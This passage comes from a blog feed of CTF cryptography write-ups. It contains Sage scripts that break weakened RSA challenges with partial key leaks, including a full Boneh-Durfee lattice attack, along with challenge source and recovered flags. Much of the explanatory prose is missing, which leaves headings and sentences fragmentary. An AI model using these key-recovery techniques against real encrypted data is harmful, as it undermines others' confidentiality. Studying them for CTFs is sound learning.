class="number">117932126002671581139669626170313849654365346787524775666511151162210096339679521576248537514813055641658722582914817481701142826861992970974206985137736311670025047752207632786439134855261541672012123572997654885689727972923659090161642085293034838535696206768459211817851404605357080649176502772728128885161</span></span><br><span class="line">c = <span class="number">5560665954852260703690321742771294743847646190564920056638605621636133720600072404637746086157764356927591996611862975162275415163691292729424412545560091018172812509230401361899309377868998693154480684535377865697939714965280441927137203589475324582174585416573174423912557361267766810988676863548944796515</span></span><br><span class="line">dm = <span class="number">0x2498aa4c85de5a33d5766f28d879f0df7175f43dd71cd4ab56ab67bf76334e6e3dcb</span></span><br><span class="line">dl = <span class="number">0x4c21c14305c34ed8f5e8879452c4ce569ce0789e6b39</span></span><br><span class="line"></span><br><span class="line">leakh = <span class="number">270</span></span><br><span class="line">leakl = <span class="number">175</span></span><br><span class="line">dbits = <span class="number">512</span></span><br><span class="line">dh = dm * <span class="number">2</span>^(dbits-leakh)</span><br><span class="line"></span><br><span class="line">k_ = e*dh // n</span><br><span class="line"></span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(e*<span class="number">2</span>^leakl))</span><br><span class="line">f = <span class="number">1</span> + (k_ + x) * ((n+<span class="number">1</span>) - y) - e*dl</span><br><span class="line"></span><br><span class="line">bounds = (<span class="number">2</span>^(dbits - leakh),<span class="number">2</span>^<span class="number">513</span>)</span><br><span class="line">res = small_roots(f,bounds,m=<span class="number">4</span>,d=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pplusq = <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">pminusq = iroot(pplusq^<span class="number">2</span>-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = (pplusq + pminusq) // <span class="number">2</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode())</span><br><span class="line"><span class="comment"># SHCTF&#123;If_people_do_not_believe_that_mathematics_is_simple,it_is_only_because_they_do_not_realize_how_complicated_life_is.&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/ekss3fOeQhhfVNMIvqrP1Q">wp</a></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p></p><p></p><blockquote><p>HermiteHermiteHermite</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ctf.qlu.edu.cn&quot;&gt;https://ctf.qlu.edu.cn&lt;/a&gt;&lt;br /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;newstar 0xgame&lt;/code&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2024&amp;&amp;2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/04/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84&amp;&amp;%E5%BC%BA%E7%BD%91%E6%9D%AF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/04/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84&amp;&amp;%E5%BC%BA%E7%BD%91%E6%9D%AF2024-WriteUp/</id>
    <published>2024-11-04T14:44:50.000Z</published>
    <updated>2024-11-10T15:41:40.177Z</updated>
    
    <content type="html"><![CDATA[<p><code>CTF</code></p><h1 id="2024"><a class="markdownIt-Anchor" href="#2024"></a> 2024</h1><h2 id="crypto001"><a class="markdownIt-Anchor" href="#crypto001"></a> CRYPTO001</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">299</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint1 = <span class="subst">&#123;hint1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint2 = <span class="subst">&#123;hint2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">123789043095302886784777548580725867919630872720308267296330863659260260632444171595208750648710642616709290340791408935502415290984231140635423328808872594955139658822363033096014857287439409252367248420356169878044065798634016290690979979625051287064109800759113475629317869327100941592970373827299442569489</span></span><br><span class="line">e = <span class="number">112070481298571389221611833986644006256566240788306316765530852688390558290807060037831460397016038678699757261874520899143918664293504728402666398893964929840011110057060969775245481057773655679041350091817099143204028098431544760662690479779286160425059494739419234859710815966582837874194763305328789592245</span></span><br><span class="line">c = <span class="number">63662561509209168743977531923281040338804656992093161358503738280395090747786427812762995865224617853709000826994250614233562094619845247321880231488631212423212167167713869682181551433686816142488666533035193128298379649809096863305651271646535125466745409868274019550361728139482502448613835444108383177119</span></span><br><span class="line">hint1 = <span class="number">897446442156802074692</span></span><br><span class="line">hint2 = <span class="number">1069442646630079275131</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br></pre></td></tr></table></figure><p><code>pq</code><code>copper</code>(?</p><p></p><p><a href="https://tangcuxiaojikuai.xyz/post/a6ee3e0e.html">https://tangcuxiaojikuai.xyz/post/a6ee3e0e.html</a><code>Insights</code></p><p><code>pq</code><br /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">1024</span></span><br><span class="line">n = <span class="number">123789043095302886784777548580725867919630872720308267296330863659260260632444171595208750648710642616709290340791408935502415290984231140635423328808872594955139658822363033096014857287439409252367248420356169878044065798634016290690979979625051287064109800759113475629317869327100941592970373827299442569489</span></span><br><span class="line">e = <span class="number">112070481298571389221611833986644006256566240788306316765530852688390558290807060037831460397016038678699757261874520899143918664293504728402666398893964929840011110057060969775245481057773655679041350091817099143204028098431544760662690479779286160425059494739419234859710815966582837874194763305328789592245</span></span><br><span class="line">c = <span class="number">63662561509209168743977531923281040338804656992093161358503738280395090747786427812762995865224617853709000826994250614233562094619845247321880231488631212423212167167713869682181551433686816142488666533035193128298379649809096863305651271646535125466745409868274019550361728139482502448613835444108383177119</span></span><br><span class="line">hint1 = <span class="number">897446442156802074692</span></span><br><span class="line">hint2 = <span class="number">1069442646630079275131</span></span><br><span class="line">ph = <span class="built_in">int</span>(hint1&lt;&lt;<span class="number">442</span>)</span><br><span class="line">qh = <span class="built_in">int</span>(hint2&lt;&lt;<span class="number">442</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#part1 boneh and durfee to get d</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">    m = <span class="number">8</span></span><br><span class="line">    delta = <span class="number">0.30</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(n^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = <span class="number">2</span>^<span class="number">442</span>   <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    A = (n+<span class="number">1</span>)//<span class="number">2</span> - (ph+qh)//<span class="number">2</span></span><br><span class="line">    PR.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    pol = <span class="number">1</span>+x*(A+y)</span><br><span class="line"><span class="comment">#     res = boneh_durfee(pol, e, m, t, X, Y)</span></span><br><span class="line"><span class="comment">#     print(res)</span></span><br><span class="line"></span><br><span class="line">k2,pl_ql = <span class="number">1476216873354030897123807900312494643299166545025397520836636477078919248983223765331825148</span>, -<span class="number">5248359230286975998007421528138879480670687275342665043065128666287838030017492213260091350908248072270884523636416440683845503716271</span></span><br><span class="line">d = (<span class="number">1</span>+k2*(A+pl_ql)) // e</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;wdflag&#123;f2cd2e39-7009-4f8f-89f3-285d50c6ca0f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto002"><a class="markdownIt-Anchor" href="#crypto002"></a> CRYPTO002</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"><span class="comment">#flag = &#x27;wdflag&#123;123&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">victory_encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    key = key.upper()</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    plaintext = plaintext.upper()</span><br><span class="line">    ciphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            ciphertext += encrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciphertext += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">victory_key = <span 